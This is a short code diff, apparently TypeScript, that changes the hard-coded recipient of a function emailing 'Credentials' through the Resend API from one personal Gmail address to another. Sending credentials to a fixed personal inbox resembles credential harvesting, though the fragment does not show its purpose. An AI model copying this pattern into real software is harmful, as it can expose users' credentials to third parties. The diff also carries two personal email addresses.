@@ -79,7 +79,7 @@ export const sendCredentialsSteffes = async (
 ) => {
   await resendAPIKEYRochelle.emails.send({
     from: "onboarding@resend.dev",
-    to: "lummybackend@gmail.com",
+    to: "rochellele25@gmail.com",
     subject: "Credentials",
     html: `
       <div>
